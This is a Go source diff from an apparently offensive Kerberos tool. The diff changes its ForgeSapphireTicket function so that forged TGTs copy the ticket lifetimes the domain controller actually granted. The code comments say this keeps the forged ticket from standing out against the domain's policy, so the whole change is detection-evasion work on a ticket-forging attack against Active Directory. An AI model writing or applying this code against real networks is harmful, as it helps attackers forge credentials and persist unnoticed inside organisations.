@@ -233,6 +233,25 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			return nil, fmt.Errorf("failed to get TGT via native AS: %w", err)
 		}
 
+		// Pull the lifetimes the KDC actually granted under domain policy.
+		// Falling back to wide defaults only if the parser failed to populate them.
+		bootAuthTime := nativeResult.AuthTime
+		if bootAuthTime.IsZero() {
+			bootAuthTime = time.Now().UTC()
+		}
+		bootStartTime := nativeResult.StartTime
+		if bootStartTime.IsZero() {
+			bootStartTime = bootAuthTime
+		}
+		bootEndTime := nativeResult.EndTime
+		if bootEndTime.IsZero() {
+			bootEndTime = bootAuthTime.Add(10 * time.Hour)
+		}
+		bootRenewTill := nativeResult.RenewTill
+		if bootRenewTill.IsZero() {
+			bootRenewTill = bootAuthTime.Add(7 * 24 * time.Hour)
+		}
+
 		// Build kirbi from native result
 		tgt = &ticket.Kirbi{
 			Cred: &asn1krb5.KRBCred{
@@ -255,11 +274,13 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 							NameType:   asn1krb5.NTSrvInst,
 							NameString: []string{"krbtgt", nativeResult.CRealm},
 						},
-						// Times for ccache export
-						AuthTime:  time.Now().UTC(),
-						StartTime: time.Now().UTC(),
-						EndTime:   time.Now().UTC().Add(10 * time.Hour),
-						RenewTill: time.Now().UTC().Add(7 * 24 * time.Hour),
+						// Times reflect what the KDC actually granted (domain policy),
+						// not hardcoded defaults. The forge step downstream reads these
+						// back to inherit the same lifetimes onto the forged TGT.
+						AuthTime:  bootAuthTime,
+						StartTime: bootStartTime,
+						EndTime:   bootEndTime,
+						RenewTill: bootRenewTill,
 						// Flags: forwardable + proxiable + renewable + initial + pre-authent + enc-pa-rep.
 						// Must match what we set on the EncTicketPart (see replacePAC block below).
 						Flags: asn1.BitString{
@@ -500,8 +521,22 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			Bytes:     []byte{0x50, 0xe1, 0x00, 0x00}, // fwd+proxy+renew+init+preauth+enc-pa-rep
 			BitLength: 32,
 		}
-		modifiedEncPart.EndTime = modifiedEncPart.AuthTime.Add(10 * time.Hour)
-		modifiedEncPart.RenewTill = modifiedEncPart.AuthTime.Add(7 * 24 * time.Hour)
+		// Inherit EndTime / RenewTill from the bootstrap TGT so the forged
+		// ticket's lifetime matches the domain's actual policy, not a
+		// hardcoded +10h/+7d that would stand out on tighter or looser policies.
+		// The bootstrap kirbi's TicketInfo[0] is populated either from the
+		// AS-REP (NativeASExchange branch) or the gokrb5 result.
+		bootInfo := tgt.CredInfo.TicketInfo[0]
+		bootEndOffset := bootInfo.EndTime.Sub(bootInfo.AuthTime)
+		bootRenewOffset := bootInfo.RenewTill.Sub(bootInfo.AuthTime)
+		if bootEndOffset <= 0 {
+			bootEndOffset = 10 * time.Hour
+		}
+		if bootRenewOffset <= 0 {
+			bootRenewOffset = 7 * 24 * time.Hour
+		}
+		modifiedEncPart.EndTime = modifiedEncPart.AuthTime.Add(bootEndOffset)
+		modifiedEncPart.RenewTill = modifiedEncPart.AuthTime.Add(bootRenewOffset)
 
 		// Mirror the EncTicketPart fields into the outer CredInfo/ccache wrapper
 		// so klist, describe, and Mimikatz see the same values the KDC does.
